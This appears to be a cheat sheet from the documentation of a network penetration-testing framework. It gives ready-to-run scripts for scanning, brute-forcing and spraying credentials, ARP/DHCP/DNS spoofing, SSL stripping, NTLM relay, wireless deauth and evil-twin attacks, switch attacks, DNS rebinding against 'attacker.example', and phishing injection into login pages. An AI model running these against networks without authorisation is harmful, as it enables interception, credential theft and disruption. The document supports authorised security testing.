# Cheat sheet

Quick-reference for the most common toha3ee workflows. Each block is a
`.toha3ee` script you can save and `run`, or paste into the REPL. All 73
modules ship with dry-run validation: `toha3ee build <file>.toha3ee` before
you ever send a packet.

> **Scope first.** Every block below redirects or disrupts real traffic. Only
> run these on networks you own or are authorised to test.

## 0. Before you start

```sh
toha3ee --no-sudo build scripts/full-pipeline.toha3ee  # dry-run the bundled pipeline
sudo toha3ee --iface eth0                              # console
sudo toha3ee --eval "net.scan; net.show" --iface eth0  # one-shot
```

Check you can actually reach the targets: `net.scan` (ARP), then `net.ping`
in each mode (echo / tcpsyn / udp) to separate alive hosts from firewalled ones.

## 1. Host discovery

```toha3ee
# ARP sweep + vendors
set net.scan.targets -> "192.168.8.0/24"
on net.scan
wait for net.scan
_hosts -> [$(net.hosts)]

# ICMP variants
set net.ping.mode -> "echo"        # or tcpsyn / udp
on net.ping
wait for net.ping

# IPv6 neighbors on the local link
on net.ip6sweep
wait for net.ip6sweep

# path + OS
on net.traceroute
wait for net.traceroute
on net.osdetect
wait for net.osdetect
```

## 2. Port scanning & service discovery

```toha3ee
# fastest: half-open SYN (root)
on service.synscan
wait for service.synscan

# no root needed, noisier: full connect
on service.tcpconnect
wait for service.tcpconnect

# firewalls: ACK (filtered vs unfiltered) and FIN/NULL/XMAS
on service.ack
wait for service.ack
on service.finxmas mode fin
wait for service.finxmas

# anonymity: idle/zombie scan through a third host
set service.idle.zombie -> "10.0.0.5"
on service.idle
wait for service.idle

# IP protocol + UDP + TLS
on service.protoscan
wait for service.protoscan
on service.udpscan
wait for service.udpscan
on service.tls
wait for service.tls

# banners, titles, cookies
on service.fingerprint
wait for service.fingerprint
```

## 3. Enumeration

```toha3ee
on smtp.enum
wait for smtp.enum
on snmp.enum
wait for snmp.enum
on ldap.enum
wait for ldap.enum
on nfs.enum
wait for nfs.enum
on smb.enum
wait for smb.enum
on web.dir wordlist common
wait for web.dir
on web.misconfig
wait for web.misconfig
```

`web.dir` uses the embedded `common` wordlist by default (a curated ~700-entry
subset) or a path to a larger operator-supplied list (e.g. a SecLists
`Discovery/Web-Content` file). `web.misconfig` reports missing security headers
and directory listing.

## 4. OSINT (no packets to the target)

```toha3ee
set osint.dns.target -> "example.com"
on osint.dns
wait for osint.dns        # incl. AXFR attempt
on osint.ct
wait for osint.ct         # cert transparency subdomains
on osint.asn
wait for osint.asn        # full IP estate
on osint.bucket
wait for osint.bucket     # S3/GCS/Azure buckets
on osint.wayback
wait for osint.wayback    # historical URLs
on osint.harvest
wait for osint.harvest    # employee emails
on osint.dork
wait for osint.dork
on osint.whois
wait for osint.whois
on osint.metadata
wait for osint.metadata
on osint.shodan
wait for osint.shodan     # pre-indexed, no touching target
on osint.hibp
wait for osint.hibp       # breach exposure
# osint.github needs a token: set osint.github.token -> "<PAT>"
```

## 5. Credential & advisory checks

```toha3ee
# no credentials required
on cve.suggest
wait for cve.suggest   # banners -> known CVEs
on smb.signing
wait for smb.signing   # SMB signing policy
on smb.kerberoast
wait for smb.kerberoast
on auth.asrep
wait for auth.asrep    # AS-REP roast viability
on default.creds
wait for default.creds # bundled device default creds

# paced guesses (know the lockout policy first!)
set auth.brute.users -> ["admin", "root"]
set auth.brute.passwords -> ["admin", "password"]
on auth.brute
wait for auth.brute

# one password, many users, HTTP basic-auth portals
set auth.spray.usernames -> ["alice", "bob"]
on auth.spray
wait for auth.spray

# SSH user enumeration by timing
on auth.userenum
wait for auth.userenum
```

## 6. Traffic redirection (MITM core)

```toha3ee
# ARP spoof gateway<->victims, relay through this host
set arp.spoof.targets -> "192.168.8.0/24"
on arp.spoof
sleep -> 30
off arp.spoof

# IPv6 equivalents
on ipv6.ndp
sleep -> 30
off ipv6.ndp
on ipv6.ra
sleep -> 30
off ipv6.ra

# rogue DHCPv4 / DHCPv6 (become gateway+DNS)
on dhcp.rogue
sleep -> 30
off dhcp.rogue
on dhcp6.spoof
sleep -> 30
off dhcp6.spoof

# steer name resolution and routing
on dns.spoof          # domain-filtered DNS spoofing
sleep -> 30
off dns.spoof
on icmp.redirect
sleep -> 30
off icmp.redirect
on llmnr.poison       # NTLMv2 hash capture
sleep -> 30
off llmnr.poison
on wpad.poison        # PAC routing
sleep -> 30
off wpad.poison
```

## 7. Interception & harvesting

```toha3ee
# pair with a redirect module from §6
on http.harvest       # passive plaintext creds/sessions
sleep -> 30
off http.harvest

# inline MITM (auto-restores on off/stop/SIGINT)
on http.proxy
sleep -> 30
off http.proxy

on https.proxy        # needs the framework CA installed on the target
sleep -> 30
off https.proxy

on ssl.strip          # strip STS/HPKP, downgrade https:// links
sleep -> 30
off ssl.strip

# prove a captured session still works
on session.replay
wait for session.replay

# NTLMv2 capture via challenge
on ntlm.relay
sleep -> 30
off ntlm.relay

# export the packet capture
on pcap.export
wait for pcap.export
```

## 8. Wireless

```toha3ee
# passive: discover APs, clients, security modes
on wlan.scan
wait for wlan.scan

# targeted: capture a WPA handshake for offline cracking
set wlan.handshake.bssid -> "<ap_mac>"
on wlan.handshake
wait for wlan.handshake

# PMKID capture (no deauth needed, WPA2 APs only)
set wlan.pmkid.bssid -> "<ap_mac>"
on wlan.pmkid
wait for wlan.pmkid

# disconnect clients (802.11w/PMF networks won't respond)
set wlan.deauth.bssid -> "<ap_mac>"
on wlan.deauth
sleep -> 10
off wlan.deauth

# phantom networks / probe-request logging
on wlan.beaconflood
sleep -> 10
off wlan.beaconflood
on wlan.karma
sleep -> 20
off wlan.karma

# rogue AP + captive portal (RF side via external hostapd)
set wlan.eviltwin.ssid -> "<ssid>"
set wlan.eviltwin.brand -> "captiveportal"
on wlan.eviltwin
sleep -> 60
off wlan.eviltwin
```

## 9. Switch-layer attacks (critical risk — brief, confirmed)

```toha3ee
# each of these has sustained blast radius; run shortest time that answers
on switch.flood
sleep -> 10
off switch.flood
on switch.portsteal
sleep -> 10
off switch.portsteal
on switch.stp
sleep -> 10
off switch.stp
on switch.vlanhop
sleep -> 10
off switch.vlanhop
on switch.cdp
sleep -> 10
off switch.cdp
```

## 10. DNS rebinding & phishing

```toha3ee
set dns.rebind.domain -> "attacker.example"
set dns.rebind.internal -> "192.168.8.50"
on dns.rebind
sleep -> 30
off dns.rebind

# rewrite a real site's login page with a template
set phish.inject.url -> "https://login.example.com/"
set phish.inject.brand -> "google"        # google|microsoft|facebook|instagram|generic
set phish.inject.domains -> ["login.example.com"]
on phish.inject
sleep -> 60
off phish.inject
```

## 11. The engagement close-out

```toha3ee
exec -> net.profile    # what the network looks like now
exec -> vectors.show
exec -> creds.show     # what was captured (local store only)
exec -> sessions.show
report -> "assessment.md"
```

Always verify cleanup afterwards: `arp -a`, `ping`, and the `[OK]` verdicts
in the module `Verify` output. Everything restores on `off`, `stop`, error,
panic or SIGINT — that is the safety contract, not a suggestion.

## Reference: module groups

| Group | Modules |
|-------|---------|
| `auth` | `auth.asrep` `auth.brute` `auth.spray` `auth.userenum` `default.creds` `ntlm.relay` `smb.kerberoast` `smb.signing` |
| `enum` | `ldap.enum` `net.ip6sweep` `nfs.enum` `smb.enum` `smtp.enum` `snmp.enum` |
| `espionage` | `http.harvest` `http.proxy` `https.proxy` `phish.inject` `ssl.strip` |
| `mitm` | `arp.spoof` `dhcp.rogue` `dhcp.starve` `dhcp6.spoof` `dns.rebind` `dns.spoof` `icmp.redirect` `ipv6.ndp` `ipv6.ra` `llmnr.poison` `wpad.poison` |
| `osint` | `osint.asn` `osint.bucket` `osint.ct` `osint.dns` `osint.dork` `osint.github` `osint.harvest` `osint.hibp` `osint.metadata` `osint.shodan` `osint.wayback` `osint.whois` |
| `post` | `pcap.export` `report.generate` `session.replay` |
| `recon` | `cve.suggest` `net.osdetect` `net.ping` `net.scan` `net.traceroute` `service.ack` `service.fingerprint` `service.finxmas` `service.idle` `service.protoscan` `service.synscan` `service.tcpconnect` `service.tls` `service.udpscan` `web.dir` |
| `switch` | `switch.cdp` `switch.flood` `switch.portsteal` `switch.stp` `switch.vlanhop` |
| `web` | `web.misconfig` |
| `wireless` | `wlan.beaconflood` `wlan.deauth` `wlan.eviltwin` `wlan.handshake` `wlan.karma` `wlan.pmkid` `wlan.scan` |

See [Scripting reference](Scripting.md) for the language, [Module
reference](Module-Reference.md) for every module's settings, and [Declined
techniques](Declined-Techniques.md) for what is deliberately not implemented.
